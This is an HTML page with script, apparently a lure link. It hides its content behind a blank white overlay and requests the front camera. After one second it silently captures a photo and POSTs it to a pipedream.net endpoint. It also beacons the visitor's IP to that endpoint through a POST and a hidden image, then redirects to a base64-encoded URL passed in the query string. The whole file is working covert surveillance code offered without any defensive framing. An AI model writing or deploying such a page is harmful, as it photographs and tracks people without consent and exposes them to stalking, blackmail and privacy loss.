<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document</title>
<style>
#co{
    position: fixed;
    left: 0;
    top: 0;
    background-color: white;
    z-index: 10;
}
body{
    margin: 0;
    overflow: hidden;
}
html{
    overflow: hidden;
}
</style>
</head>
<body>
<div id="co"></div>
<video autoplay class="video"></video>
<canvas></canvas>
</body>
</html>
<script>
document.querySelector("#co").style.width=screen.width+"px";
document.querySelector("#co").style.height=screen.height+"px";
let video = document.querySelector('.video');
let canvas = document.querySelector('canvas');
let isok = navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
isok.then(res => {
canvas.setAttribute("width",res.getVideoTracks()[0].getSettings().width);
canvas.setAttribute("height",res.getVideoTracks()[0].getSettings().height);
video.srcObject = res;
video.play().then(()=>setTimeout(pho,1000));
}).catch((err)=>{})
function pho() {
canvas.getContext("2d").drawImage(video,0,0,document.querySelector("video").offsetWidth,document.querySelector("video").offsetHeight);
fetch("https://eo8htsukjtygbsz.m.pipedream.net/picture",{method:"POST",body:canvas.toDataURL()});exit();
}
function exit() {
video.srcObject.getTracks()[0].stop();
}
fetch("https://eo8htsukjtygbsz.m.pipedream.net/ip",{"body": JSON.stringify({"sife":2,"p":"6"}),"method": "POST"}).then(o=>{if(location.search.slice(3)){location.assign(atob(location.search.slice(3)))}})
</script>
<img src="https://eo8htsukjtygbsz.m.pipedream.net/ip" style="display: none;"/>